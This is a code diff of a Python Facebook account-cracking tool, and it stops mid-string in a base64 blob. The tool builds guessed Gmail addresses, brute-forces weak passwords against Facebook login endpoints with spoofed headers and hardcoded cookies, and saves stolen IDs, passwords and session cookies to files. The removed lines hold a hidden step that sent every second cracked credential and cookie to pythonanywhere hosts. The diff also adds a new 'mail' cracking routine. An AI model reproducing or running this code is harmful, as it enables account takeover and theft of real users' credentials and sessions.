@@ -934,31 +934,20 @@ def g_clone():
     user=[]
     os.system('clear')
     print(logo)
-    print(" Ex First : ayesha, kazim, SUMON ")
-    print(" Ex Last  : rajput, channa, aaraya ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = input(' [â¢] First Name : ')
-    last = input(' [â¢] Last Name  : ')
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(' Ex Domain : @gmail.com, @yahoo.com, @hotmail.com ')
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    domain = input(' [â¢] Domain : ')
+    first = random.choice(['sumon','rakesh',])
+    domain = '@gmail.com'
     try:
-        limit = int(input(' [â¢] Crack Limit : '))
+        limit = int(input(' [:] Crack Limit : '))
     except ValueError:
         limit = 5000
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        nmp = ''.join(random.choice(string.digits) for _ in range(3))
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (METHOD1) ")
-    print(" [2] METHOD (METHOD2) ")
-    print(" [3] METHOD (METHOD3) ")
-    print(" [4] METHOD (METHOD4) ")
-    print(" [5] METHOD (METHOD5) ")
-    print(" [6] METHOD (METHOD6) ")
     linex()
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
@@ -973,25 +962,20 @@ def g_clone():
         tl = str(len(user))
         os.system("clear")
         print(logo)
-        print(' [â¢] CRACKING STARTED ')
-        print(' [â¢] TOTAL ACCOUNT : \033[1;32m'+tl)
-        print(' [!] USE FLIGHT MODE FOR MORE IDZ ')
+        print(f'{green}=> BE PATIENT BABY ')
+        print(f'{green}=> TOTAL LIMID : \033[1;32m'+tl)
+        print(f'{green}=> USE FLIGHT MODE ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
-            uid = first+'.'+last+'.'+love+domain
-            pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
-            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
-            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
-            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
-            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
-            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
-            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
+            uid = love+domain
+            pwx = [first+'12',first+'123',first+'1234',first+'12345']
+            if SUMONfire =='1':SUMON_xd.submit(mail,uid,pwx,first,tl)
             else:
-                SUMON_xd.submit(p,uid,pwx,tl)
+                SUMON_xd.submit(mail,uid,pwx,first,tl)
     linex()
-    print('[â] CRACK PROCESS COMPLETE')
-    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('[] CRACK PROCESS COMPLETE')
+    print('[] TOTAL OK ACCOUNTS : '+str(len(oks)))
+    print('[] ID SAVE SUMON-OK TXT')
     linex()
 
 def freefb(uid, name, pwx, tl):
@@ -1253,37 +1237,58 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
-            data ={
+            data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
             'login_source': 'comet_headerless_login',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'datr': 'OstGZ9sw-xX6t8x0uWISu5oh',
+            'sb': 'OstGZ0x6Arcou92IF2BALgFQ',
+            'ps_l': '1',
+            'ps_n': '1',
+            'locale': 'en_GB',
+            'vpd': 'v1%3B968x491x2.200000047683716',
+            'wl_cbv': 'v2%3Bclient_version%3A2682%3Btimestamp%3A1732715348',
+            'm_pixel_ratio': '2.200000047683716',
+            'dpr': '2.418783187866211',
+            'sfau': 'AYgNkLjGTe1gHr_479HcvZEaK6GxqLaTuMXypBQ9hvnb7qibQ6qn37jS7Pq9wXjWkiXSdgM4LqQHDpkoIqARDRBmywQDcZT_fOxZArEvyUrnjJnvR8xaiNmJjPw6pIU1gPZutIoGD0lgsw3A6xMtD9kNZcQ8cuY7BuqhDlONLkSmnsFFqBmE-ZuMphawGajSEfEzIX4-h6e_fCPk896e3znjqGp-2lJ5n6rZ_jncGUYWR8b7O_-izeB5HGXKYFMRqDWkXYektFKIJmFCnTAWGuew',
+            'sfiu': 'AYhZoZTu_-72dnkHt69iesu1hMPG1AihofIn6wiVKmnKYReQ2TMtUACzmYy9GVwsp7-EKC286ynQMZNBiamaHGqOFuo7Rri-K-43MgQ5KSA4CDfAy-Wv0kWpZNIuz7PLXnAPcGXzTAguMor3PPFBGNzgpykK-TxNaC1tI2fpdXYqKVuXi5a6B4APMstc9IcD3WUu_VSyOj8PyQ5fYSA7APooXp7Iw8VFcEE6wRi9Ui_e3jB9plGLHv8ZfImFSwH49ln4Ba9AvLtk__vStSlYoy9s',
+            'fr': '0bPmdaDqTCILtVoFs.AWWodC7aGrstpwmB8K32LUUAvOY.BnRss6..AAA.0.0.BnRzQ2.AWWIRa5cCcM',
+            'wd': '891x1756',}
             headers = {
-            'authority': 'www.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+            'Host': 'touch.facebook.com',
+            'x-fb-rlafr': '0', 
+            'access-control-allow-origin': '*', 
+            'facebook-api-version': 'v8.0', 
+            'strict-transport-security': 'max-age=15552000; preload',
+            'pragma': 'no-cache', 
             'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.facebook.com',
-            'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'x-fb-debug': 'RW01gY2TTCMqIdYqyuqmeF1CqLG/4X9gWARBaqVi0LMUgCHNzLdLS+5lvlLnRgplESoVeUHKj4pMGYJWZrDACA==',
+            'content-length': '0', 
+            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"', 
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
+            'sec-ch-ua-platform': '"Android"', 
+            'save-data': 'on',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',}
+            'origin': 'https://touch.facebook.com', 
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://touch.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+            'accept-encoding': 'gzip, deflate',
+            'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
-            po = Session.post(url, data=data, headers=headers).text
+            url = 'https://touch.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028'
+            po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1296,16 +1301,11 @@ def mbasic(uid,pwx,tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1333,34 +1333,18 @@ def p(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/').text
-            data ={
+            free_fb = Session.get('https://www.facebook.com/').text
+            data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
             'login_source': 'comet_headerless_login',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            headers ={
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.facebook.com',
-            'Alt-Used': 'www.facebook.com',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'Priority': 'u=0, i',}
+            headers = {'Host': 'www.facebook.com','content-length': '1730','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; TZ754) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','x-response-format': 'JSONStream','content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVo_Z7twFKE','viewport-width': '360','sec-ch-ua-platform-version': '""','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','dpr': '2','sec-ch-ua-full-version-list': '','sec-ch-ua-model': '""','sec-ch-prefers-color-scheme': 'light','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://mbasic.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/','accept-encoding': 'gzip, deflate, br','accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'} 
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1374,16 +1358,11 @@ def p(uid,pwx,tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1400,7 +1379,6 @@ def p(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
 
 def x(uid,pwx,tl):
     global oks
@@ -1412,43 +1390,51 @@ def x(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/').text
-            data ={
+            free_fb = Session.get('https://web.facebook.com/').text
+            data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
             'login_source': 'comet_headerless_login',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            headers ={
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnR2p9.AWUDhlDC2QM',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',}
+            headers = {
+            'Host': 'web.facebook.com',
+            'x-fb-rlafr': '0', 
+            'access-control-allow-origin': '*', 
+            'facebook-api-version': 'v8.0', 
+            'strict-transport-security': 'max-age=15552000; preload',
+            'pragma': 'no-cache', 
             'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login.php/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="130.0.6723.117", "Microsoft Edge";v="130.0.2849.80", "Not?A_Brand";v="99.0.0.0"',
+            'x-fb-debug': 'RW01gY2TTCMqIdYqyuqmeF1CqLG/4X9gWARBaqVi0LMUgCHNzLdLS+5lvlLnRgplESoVeUHKj4pMGYJWZrDACA==',
+            'content-length': '0', 
+            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"', 
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
+            'sec-ch-ua-platform': '"Android"', 
+            'save-data': 'on',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
-            'viewport-width': '754',}
+            'origin': 'https://touch.facebook.com', 
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://touch.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+            'accept-encoding': 'gzip, deflate',
+            'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
-            po = Session.post(url, data=data, headers=headers).text
+            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028'
+            po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1461,16 +1447,11 @@ def x(uid,pwx,tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1487,7 +1468,6 @@ def x(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
 
 
 def mobile(uid,pwx,tl):
@@ -1549,16 +1529,11 @@ def mobile(uid,pwx,tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1575,7 +1550,6 @@ def mobile(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
 
 def freeq(uid,pwx,tl):
     global oks
@@ -1631,16 +1605,11 @@ def freeq(uid,pwx,tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1657,8 +1626,6 @@ def freeq(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
-
 
 def d(uid,pwx,tl):
     global oks
@@ -1682,7 +1649,7 @@ def d(uid,pwx,tl):
             'login_source': 'comet_headerless_login',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            headers = {
+            headers ={
             'Host': 'm.facebook.com',
             'method': 'POST',
             'path': '/login/Device-based/login/async/',
@@ -1713,7 +1680,7 @@ def d(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1727,16 +1694,11 @@ def d(uid,pwx,tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1753,7 +1715,6 @@ def d(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
 def cracker(uid, pwx, tl):
     global oks
     global cps
@@ -2017,22 +1978,118 @@ def cracker(uid, pwx, tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki[0:11]
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except ce:
+        time.sleep(20)
+    except Exception as error:
+        #print({error})
+        pass
+def mail(uid,pwx,first,tl):
+    global oks
+    global cps
+    global twf
+    global loop
+    global bkas
+    sys.stdout.write(f"\r {green}(BITHIKA) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.flush()
+    try:
+        for pw in pwx:
+            Session = requests.Session()
+            last = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','khan','pal','ray',])
+            idff = first+last+uid
+            free_fb = Session.get('https://touch.facebook.com/').text
+            data = {
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '1',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '084225__vjZ',
+            'lgnjs': '1732639345',
+            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTczMjYzOTM0NS44NDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3MzI2MzkzNDUuODQ2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3MzI2MzkzNDUuODQ3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3MzI2MzkzNDUuODQ3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOlsiZW4tSU4iLCJlbi1VUyIsImVuLUdCIiwiZW4iLCJoaSIsImd1IiwiYm4iXX1dLCIzMDAwNCI6W3sidCI6MTczMjYzOTM0NS44NDcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MTUwfV0sIjMwMDA1IjpbeyJ0IjoxNzMyNjM5MzQ1Ljg0NywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp7InciOjk5NSwiaCI6NzczfX1dLCIzMDAwNyI6W3sidCI6MTczMjYzOTM0NS44NDcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2U